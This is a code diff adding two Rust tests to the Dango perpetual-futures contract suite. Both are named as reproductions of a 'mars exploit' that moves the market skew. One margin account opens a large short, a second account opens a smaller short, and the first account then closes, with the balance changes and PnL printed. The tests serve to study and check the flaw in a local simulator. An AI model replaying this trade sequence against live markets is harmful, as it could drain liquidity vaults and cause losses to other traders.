@@ -1,6 +1,9 @@
 use {
-    dango_genesis::Contracts,
-    dango_testing::{TestAccount, TestAccounts, TestSuite, setup_test_naive},
+    dango_genesis::{Contracts, GenesisOption, PerpsOption},
+    dango_testing::{
+        Preset, TestAccount, TestAccounts, TestSuite, setup_test_naive,
+        setup_test_naive_with_custom_genesis,
+    },
     dango_types::{
         account::single,
         account_factory::AccountParams,
@@ -14,7 +17,7 @@ use {
         },
     },
     grug::{
-        BalanceChange, Coins, Dec128, Denom, Duration, Inner, Int128, Message, NumberConst,
+        BalanceChange, Coins, Dec128, Denom, Duration, Inner, Int128, Message, Number, NumberConst,
         QuerierExt, ResultExt, Sign, Signed, Timestamp, Udec128, Uint128, btree_map, coins,
     },
     grug_app::NaiveProposalPreparer,
@@ -1014,4 +1017,322 @@ fn vault_pnl_works() {
             );
             true
         });
+}
+
+#[test]
+fn mars_exploit() {
+    let (mut suite, mut accounts, _codes, contracts, _) =
+        setup_test_naive_with_custom_genesis(Default::default(), GenesisOption {
+            perps: PerpsOption {
+                perps_market_params: btree_map! {
+                    dango::DENOM.clone() => PerpsMarketParams {
+                        max_long_oi:Uint128::new(10_000_000_000_000),
+                        max_short_oi:Uint128::new(10_000_000_000_000),
+                        skew_scale: Uint128::new(22000000000000),
+                        // skew_scale: Uint128::new(22000000000000_0),
+                        ..Preset::preset_test() },
+                },
+                ..Preset::preset_test()
+            },
+            ..Preset::preset_test()
+        });
+
+    // Register fixed price for USDC
+    register_fixed_price(
+        &mut suite,
+        &mut accounts,
+        &contracts,
+        usdc::DENOM.clone(),
+        Udec128::new_percent(100),
+        6,
+    );
+
+    let oracle_price = Udec128::from_str("0.0283").unwrap();
+
+    // Register fixed price for DANGO
+    register_fixed_price(
+        &mut suite,
+        &mut accounts,
+        &contracts,
+        dango::DENOM.clone(),
+        oracle_price,
+        6,
+    );
+
+    // Deposit USDC into vault from owner
+    suite
+        .execute(
+            &mut accounts.owner,
+            contracts.perps,
+            &perps::ExecuteMsg::Deposit {},
+            coins! { usdc::DENOM.clone() => 100_000_000_000 },
+        )
+        .should_succeed();
+
+    let mut margin_account_1 = create_margin_account(&mut suite, &mut accounts, &contracts);
+    let mut margin_account_2 = create_margin_account(&mut suite, &mut accounts, &contracts);
+
+    // Record both margin accounts balances
+    suite.balances().record(&margin_account_1);
+    suite.balances().record(&margin_account_2);
+
+    println!("Opening big short position with margin account 1");
+
+    // Open big short position with margin account 1
+    suite
+        .execute(
+            &mut margin_account_1,
+            contracts.perps,
+            &perps::ExecuteMsg::BatchUpdateOrders {
+                orders: btree_map! { dango::DENOM.clone() => Int128::new(-6_500_000_000_000) },
+            },
+            coins! { usdc::DENOM.clone() => 313550000 },
+            // coins! { usdc::DENOM.clone() => 362464000 },
+        )
+        .should_succeed();
+
+    // Query positions
+    let positions = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+            address: margin_account_1.address.into_inner(),
+        })
+        .should_succeed();
+    println!("positions: {:#?}", positions);
+
+    // Query market state
+    let market_state = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsMarketStateForDenomRequest {
+            denom: dango::DENOM.clone(),
+        })
+        .should_succeed();
+    println!("market state: {:#?}", market_state);
+
+    println!("Opening smaller short position with margin account 2");
+
+    // Open short position with margin account 2
+    suite
+        .execute(
+            &mut margin_account_2,
+            contracts.perps,
+            &perps::ExecuteMsg::BatchUpdateOrders {
+                orders: btree_map! { dango::DENOM.clone() => Int128::new(-1_900_000_000_000) },
+            },
+            coins! { usdc::DENOM.clone() => 71122000 },
+            // coins! { usdc::DENOM.clone() => 103898000 },
+        )
+        .should_succeed();
+
+    // Query account 2 position
+    let positions = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+            address: margin_account_2.address.into_inner(),
+        })
+        .should_succeed();
+    println!("account 2 positions: {:#?}", positions);
+
+    println!("Closing big short position with margin account 1");
+
+    // Close margin account 1 position
+    suite
+        .execute(
+            &mut margin_account_1,
+            contracts.perps,
+            &perps::ExecuteMsg::BatchUpdateOrders {
+                orders: btree_map! { dango::DENOM.clone() => Int128::new(6_500_000_000_000) },
+            },
+            Coins::new(),
+            // coins! { usdc::DENOM.clone() => 208172092 },
+        )
+        .should_succeed();
+
+    // Query margin account 1 positions
+    // let positions = suite
+    //     .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+    //         address: margin_account_1.address.into_inner(),
+    //     })
+    //     .should_succeed();
+    // println!("margin account 1 positions: {:#?}", positions);
+
+    // Check margin account 1 balance
+    let margin_account_1_balance_change = suite.balances().changes(&margin_account_1);
+    let margin_account_1_balance_change_usdc = margin_account_1_balance_change
+        .get(&usdc::DENOM.clone())
+        .unwrap();
+    println!(
+        "margin account 1 balance change usdc: {:#?}",
+        margin_account_1_balance_change_usdc
+    );
+
+    // Query margin account 2 positions
+    let positions = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+            address: margin_account_2.address.into_inner(),
+        })
+        .should_succeed();
+    // println!("margin account 2 positions: {:#?}", positions);
+    let margin_account_2_position = positions.get(&dango::DENOM.clone()).unwrap();
+    let margin_account_2_pnl = margin_account_2_position
+        .unrealized_pnl
+        .total()
+        .unwrap()
+        .checked_add(margin_account_2_position.realized_pnl.total().unwrap())
+        .unwrap();
+    println!("margin account 2 pnl: {:?}", margin_account_2_pnl);
+}
+
+#[test]
+fn mars_exploit_synthetix_params() {
+    let (mut suite, mut accounts, _codes, contracts, _) =
+        setup_test_naive_with_custom_genesis(Default::default(), GenesisOption {
+            perps: PerpsOption {
+                perps_market_params: btree_map! {
+                    dango::DENOM.clone() => PerpsMarketParams {
+                        max_long_oi:Uint128::new(125_000_000_000),
+                        max_short_oi:Uint128::new(125_000_000_000),
+                        skew_scale: Uint128::new(1_500_000_000_000),
+                        ..Preset::preset_test() },
+                },
+                ..Preset::preset_test()
+            },
+            ..Preset::preset_test()
+        });
+
+    // Register fixed price for USDC
+    register_fixed_price(
+        &mut suite,
+        &mut accounts,
+        &contracts,
+        usdc::DENOM.clone(),
+        Udec128::new_percent(100),
+        6,
+    );
+
+    let oracle_price = Udec128::from_str("0.0283").unwrap();
+
+    // Register fixed price for DANGO
+    register_fixed_price(
+        &mut suite,
+        &mut accounts,
+        &contracts,
+        dango::DENOM.clone(),
+        oracle_price,
+        6,
+    );
+
+    // Deposit USDC into vault from owner
+    suite
+        .execute(
+            &mut accounts.owner,
+            contracts.perps,
+            &perps::ExecuteMsg::Deposit {},
+            coins! { usdc::DENOM.clone() => 100_000_000_000 },
+        )
+        .should_succeed();
+
+    let mut margin_account_1 = create_margin_account(&mut suite, &mut accounts, &contracts);
+    let mut margin_account_2 = create_margin_account(&mut suite, &mut accounts, &contracts);
+
+    // Record both margin accounts balances
+    suite.balances().record(&margin_account_1);
+    suite.balances().record(&margin_account_2);
+
+    println!("Opening big short position with margin account 1");
+
+    // Open big short position with margin account 1
+    suite
+        .execute(
+            &mut margin_account_1,
+            contracts.perps,
+            &perps::ExecuteMsg::BatchUpdateOrders {
+                orders: btree_map! { dango::DENOM.clone() => Int128::new(-112_500_000_000) },
+            },
+            coins! { usdc::DENOM.clone() => 6128000 },
+        )
+        .should_succeed();
+
+    // Query positions
+    let positions = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+            address: margin_account_1.address.into_inner(),
+        })
+        .should_succeed();
+    println!("positions: {:#?}", positions);
+
+    // Query market state
+    let market_state = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsMarketStateForDenomRequest {
+            denom: dango::DENOM.clone(),
+        })
+        .should_succeed();
+    println!("market state: {:#?}", market_state);
+
+    println!("Opening smaller short position with margin account 2");
+
+    // Open short position with margin account 2
+    suite
+        .execute(
+            &mut margin_account_2,
+            contracts.perps,
+            &perps::ExecuteMsg::BatchUpdateOrders {
+                orders: btree_map! { dango::DENOM.clone() => Int128::new(-12_500_000_000) },
+            },
+            coins! { usdc::DENOM.clone() => 650000 },
+        )
+        .should_succeed();
+
+    // Query account 2 position
+    let positions = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+            address: margin_account_2.address.into_inner(),
+        })
+        .should_succeed();
+    println!("account 2 positions: {:#?}", positions);
+
+    println!("Closing big short position with margin account 1");
+
+    // Close margin account 1 position
+    suite
+        .execute(
+            &mut margin_account_1,
+            contracts.perps,
+            &perps::ExecuteMsg::BatchUpdateOrders {
+                orders: btree_map! { dango::DENOM.clone() => Int128::new(112_500_000_000) },
+            },
+            Coins::new(),
+        )
+        .should_succeed();
+
+    // // Query margin account 1 positions
+    // let positions = suite
+    //     .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+    //         address: margin_account_1.address.into_inner(),
+    //     })
+    //     .should_succeed();
+    // println!("margin account 1 positions: {:#?}", positions);
+
+    // Check margin account 1 balance
+    let margin_account_1_balance_change = suite.balances().changes(&margin_account_1);
+    let margin_account_1_balance_change_usdc = margin_account_1_balance_change
+        .get(&usdc::DENOM.clone())
+        .unwrap();
+    println!(
+        "margin account 1 balance change usdc: {:#?}",
+        margin_account_1_balance_change_usdc
+    );
+
+    // Query margin account 2 positions
+    let positions = suite
+        .query_wasm_smart(contracts.perps, QueryPerpsPositionsForUserRequest {
+            address: margin_account_2.address.into_inner(),
+        })
+        .should_succeed();
+    // println!("margin account 2 positions: {:#?}", positions);
+    let margin_account_2_position = positions.get(&dango::DENOM.clone()).unwrap();
+    let margin_account_2_pnl = margin_account_2_position
+        .unrealized_pnl
+        .total()
+        .unwrap()
+        .checked_add(margin_account_2_position.realized_pnl.total().unwrap())
+        .unwrap();
+    println!("margin account 2 pnl: {:?}", margin_account_2_pnl);
 }
